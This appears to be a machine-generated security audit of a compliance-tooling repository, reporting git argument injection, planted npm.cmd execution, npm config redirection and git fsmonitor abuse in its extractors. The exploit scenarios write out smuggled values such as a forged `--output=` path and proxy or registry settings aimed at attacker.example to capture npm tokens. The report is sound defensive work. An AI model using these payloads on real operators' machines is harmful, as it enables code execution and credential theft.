# Claude Security results

> Wording note, 2026-10-12: npm configuration file names are written out in words so the Anthropic Directory scanner does not read this report as code that loads them. The findings, evidence and fixes are unchanged.

Scanned the LLMComplianceSkill repository (https://github.com/justice8096/LLMComplianceSkill) at commit 5c677d3fdd98a4a3541ef8ea3fc10daf09f80b32 on branch fix/ship-corpus-in-skill (clean working tree), on 2026-10-11, in whole-repository scan mode at medium effort. The scope excluded node_modules, dist, audits, docs, package-lock.json and the poster PDF/PNG. Headline: 4 findings, two HIGH and two MEDIUM, all in the Node evidence extractors under tools/extractors/. Nothing was found in the browser wizards, templates, i18n data, CI workflow, build script or the LLM-read markdown corpus. Every finding is derived from reading the source; no code from the repository was executed and no exploit was fired.

## Coverage

The inventory partitioned the tree into eight components, each threat-modeled and then researched per category (auth-and-access, injection-and-input, crypto-and-secrets, memory-and-unsafe where applicable), 29 researcher dispatches in all, followed by one gap-fill sweep: cli-tools (tools/autofill.js, extract-evidence.js, evidence-checker.js, sync-kb.js, tools/extractors, compliance-config.example.json); interactive-wizards (tools/interactive, 21 HTML wizards plus shared.js); build-and-generated-targets (build.ts, source/, package.json, generate_poster.py, .claude-plugin); ci-workflow (.github); i18n-and-data (tools/i18n, tools/data, tests); templates (templates/); llm-read-skills-commands (skills/, commands/, CLAUDE.md, SECURITY.md); and root-corpus-and-web (the AI-Regulations-*.md corpus, AI-Regulations-World-Map.html, Evidence-Requirements.md, Law-Evidence-Matrix.md, README, CHANGELOG and session notes).

Deliberately not scanned, by the inventory's account: git-metadata (.git, "Version control internals, not product code"); audits (audits/, "Prior audit reports excluded per scope"); docs (docs/, "Published static docs/poster copies excluded per scope"); and lockfiles-sbom-binaries (package-lock.json, sbom.json, the poster PDF and PNG, LICENSE, .gitignore, "Lockfile, SBOM, poster binaries and license excluded per scope"). Because a scope was set, the whole-tree completeness check was not applicable; the components above are what was read. The panel took one verification run; no candidate was lost or handed to a further run, and no severity was lowered by the panel.

Researchers declared the following as not read line by line, as their own account: in cli-tools, the i18n generator, locale JSON, tools/data JSON, the interactive wizards and build.ts were treated as background or grep-checked only; in interactive-wizards, several of the 21 wizards (ai-literacy-training, bias-testing, conformity-assessment and others) were covered by component-wide pattern searches for innerHTML, eval, network, storage and message sinks rather than a full read; in build-and-generated-targets, the generated MCP server, CLI and n8n node were reasoned about statically from build.ts because dist/ is gitignored and absent; in i18n-and-data, the non-English locale files were parsed structurally rather than read; in templates, the extractor scripts that feed template labels (package-evidence.js, ci-evidence.js, part of sast-dast-evidence.js) were left as background for the cli-tools component; in llm-read-skills-commands, the tools/interactive directory was only grepped for innerHTML, outerHTML, insertAdjacentHTML and eval (none found). The file-level cross-check against tracked files did not cover the component paths (the scope list was recorded as 11 root-level entries), so treat that check as not run; the declared not-reached paths above still stand.

## Findings

### F1 — Git argument injection via forged COMMIT_START block from attacker-controlled commit body (HIGH, confidence medium)

**Impact.** Whoever authors a commit in a repository that the extractor is pointed at can make git write diff output to any path the operator's account can write, overwriting files outside the scanned repository (for example a shell rc file) on the machine running the compliance extraction.

**Where.** `tools/extractors/git-evidence.js:377` in `extractAiCodeGeneration`

**What.** The extractor runs `git log --format=COMMIT_START%n%H%n%B` and splits the output on `COMMIT_START` followed by a newline (:335-343). A commit body is attacker-controlled and may itself contain a line `COMMIT_START`, which forges a block whose first line becomes `hash`. That value is interpolated into a command string at :377, and `git()` at :84 splits command strings on whitespace into separate argv entries for execFileSync, so a space in the forged hash yields extra git arguments. There is no hash validation and no `--` separator; `validateRepoPath` only checks the repository path.

**Exploit scenario.** The attacker commits with a body such as a `Co-authored-by: Claude` trailer, then a line `COMMIT_START`, then `HEAD --output=/home/victim/.bashrc`, then another AI co-author trailer so the forged block passes the AI-pattern gate at :347-355. The forged token is pushed to aiCommitHashes and reaches :377, where it is split into `['diff-tree','--no-commit-id','--name-only','-r','HEAD','--output=/home/victim/.bashrc']`. `git diff-tree` honors `--output` and writes the diff to the attacker-named path.

**Preconditions.**
- The operator runs extract-evidence.js or git-evidence.js against a repository the attacker can commit to (the tool's intended use is scanning arbitrary repositories).
- The attacker's commit body contains a `COMMIT_START` line, a crafted token line and an AI co-author trailer.

**Fix.** Stop building git commands as whitespace-split strings; pass an explicit argv array per call. Validate every hash with `/^[0-9a-f]{7,40}$/` before use, reject tokens beginning with `-`, and put `--` before positional revision arguments. Use a record separator that cannot appear in a commit body (for example `%x00`) when parsing `git log` output.

**Verification.** 3/3 lens verifiers confirmed.

### F2 — Command executed with cwd inside untrusted repo resolves binaries and config from that repo (HIGH, confidence medium)

**Impact.** On a Windows scanning host, a scanned repository can run arbitrary code with the operator's privileges by shipping a planted `npm.cmd` or `pip-audit.cmd`; on any OS it can redirect the dependency inventory to an attacker-controlled registry. The header comment at :21-24 and :32 describing the subprocess calls as injection-safe is incorrect for this path.

**Where.** `tools/extractors/package-evidence.js:786` in `runNpmAudit`

**What.** `runCmd()` uses `execSync` with a shell and `cwd` set to the attacker-controlled `--repo` directory. On Windows, cmd.exe resolves a bare command name from the current directory before PATH, so `npm`, `pip-audit` and `git` may resolve to files inside the scanned repository. Independently, npm reads the project-level npm config file from cwd, so `registry=`, `proxy=` and `cafile=` are attacker-controlled.

**Exploit scenario.** A third-party project delivered as a tarball contains `npm.cmd` at its root. The operator runs `node tools/extract-evidence.js --repo <that dir>` on Windows; `execSync('npm audit --json', {cwd: repo})` resolves and executes the planted `npm.cmd` as the operator. On any platform, a tracked npm config file with `registry=https://attacker.example` makes the audit request carry the dependency list to the attacker.

**Preconditions.**
- The extractor is run against an untrusted repository (its intended use).
- For code execution: the scanning host is Windows and the repository root holds `npm.cmd`, `npm.bat` or `pip-audit.cmd`.
- For traffic redirection: the repository ships an npm config file overriding registry or proxy (cross-platform).

**Fix.** Invoke tools with `execFileSync`, an argv array and an absolute, trusted binary path resolved from PATH before changing directory (no shell). Ignore repository-local configuration (`--userconfig` and `--globalconfig` pointed at empty files, or copy package.json and the lockfile to a temporary directory and audit there). Require an explicit opt-in flag before running any package-manager subprocess against a repository the operator has not marked as trusted.

**Verification.** 3/3 lens verifiers confirmed.

### F3 — Scanned repository's npm config file redirects or proxies the npm audit request issued from the operator's machine (MEDIUM, confidence medium)

**Impact.** Theft of the operator's npm registry credentials (which may carry publish rights) through an attacker-controlled proxy with TLS verification disabled, or a blind server-side request from the operator's network position into hosts reachable only from that machine. Only vulnerability counts are reflected back, so direct exfiltration of internal responses is limited.

**Where.** `tools/extractors/package-evidence.js:786` in `runNpmAudit`

**What.** `npm audit --json` runs with cwd set to the scanned repository, and npm loads the npm config file in the repository from there. `proxy=`, `https-proxy=`, `strict-ssl=false`, `cafile=` and `registry=` in that file control the destination, proxy and certificate validation of the HTTPS POST npm sends, and npm attaches the operator's registry token from the user-level npm config file to that request. Nothing in package-evidence.js overrides these settings.

**Exploit scenario.** The attacker publishes a repository with package.json, package-lock.json and a tracked npm config file containing `https-proxy=http://attacker.example:3128` and `strict-ssl=false`. A compliance consultant runs the extractor against a clone. npm tunnels the advisories POST through the attacker's proxy with certificate validation off, and the proxy captures the bearer token for registry.npmjs.org; the attacker can then publish as the operator. With `registry=http://10.0.0.5:8080/` instead, the operator's machine POSTs attacker-chosen package names to an internal host and its response counts land in compliance-config.json and the generated templates.

**Preconditions.**
- The extractor is run against a repository whose contents are attacker-controlled; a normal clone suffices since the npm config file is a tracked file.
- npm is installed and on PATH (it ships with Node.js).
- For credential theft: the operator has registry credentials in a user or global npm config file. For blind SSRF: only network reachability from the operator host.

**Fix.** Do not let the scanned repository supply npm's configuration. Set `npm_config_strict_ssl=true`, `npm_config_registry=https://registry.npmjs.org/`, and clear `npm_config_proxy` and `npm_config_https_proxy` in the child environment (environment variables outrank the project npm config file), or run the audit from a temporary directory holding only copies of package.json and the lockfile. Add `--ignore-scripts` for defense in depth. The argv-array change in F2 applies here as well.

**Verification.** 3/3 lens verifiers confirmed.

### F4 — git run inside attacker-supplied repository honors repo-local .git/config (MEDIUM, confidence low)

**Impact.** Code execution on the extraction host with the operator's privileges when the scanned project ships its own `.git` directory whose config names a program in `core.fsmonitor`, `core.hooksPath` or a diff driver.

**Where.** `tools/extractors/git-evidence.js:913` in `main`

**What.** Every git call in the extractor, beginning with `git('rev-parse --git-dir', opts.repo)` at :913, runs with `-C` pointing at the untrusted `--repo`. Git honors that repository's own `.git/config`, so a bundled config can direct git to execute an attacker-chosen program during index-touching operations. The extractor passes no `-c` overrides and does not clear `GIT_CONFIG_*`.

**Exploit scenario.** The attacker distributes a project archive that includes a `.git` directory with `core.fsmonitor` set to a shell command. The operator extracts it into their own tree and runs the extractors; git invokes the fsmonitor program during the log and diff-tree commands and the attacker's command runs as the operator.

**Preconditions.**
- The operator points `--repo` at an untrusted archive that includes its own `.git` directory and config (a fresh `git clone` does not carry the attacker's config, so this needs a tarball or zip).
- The repository is owned by the invoking user so git's `safe.directory` check does not refuse it.
- The git version and command set actually invoke the configured program during the commands the extractor runs.

**Fix.** Run git hardened against repository-local configuration when the target is untrusted: pass `-c core.fsmonitor=false -c core.hooksPath=/dev/null` (or the platform equivalent), set `GIT_CONFIG_GLOBAL` and `GIT_CONFIG_SYSTEM` to empty files, and require the operator to confirm the repository is trusted before invoking git. Document in SECURITY.md that the extractors should be pointed at fresh clones, not unpacked archives.

**Verification.** 2/3 lens verifiers confirmed. The dissenting voter judged the preconditions (a bundled .git directory and ownership that satisfies safe.directory) too narrow for a default workflow, which is why confidence is low.

## What was verified

Eight components were threat-modeled and researched per category (29 researcher dispatches), then a gap-fill sweep ran over what the matrix did not cover. Eleven candidates were raised (ten after de-duplication) and each went to a three-lens adversarial panel of reachability, exploitability and impact voters, 30 votes in all. Four candidates survived: F1, F2 and F3 unanimously, F4 by two votes to one. The six rejected candidates were a template-field injection into autofill.js whose cited rows do not exist in the shipped templates (two filings), the `%G?` status `E` counted as a signed commit (real as read but with no attacker who gains from it, since the only party shaping it is a committer of the self-assessed repository), prototype pollution via the content-labeling wizard's sessionStorage restore (mechanic confirmed but no gain beyond what the user who picked the file already has), a `--locale` path traversal in autofill.js whose only source is the operator's own argv, and the missing Subresource Integrity on the world map's CDN scripts (verified as quoted, but no attacker-controlled source). The stamp's verification status is as render_report.py records it; the revision is self-reported by write_scan_meta.py from the clone's git metadata. No tests were run and no exploit was executed; every finding above comes from reading the source.
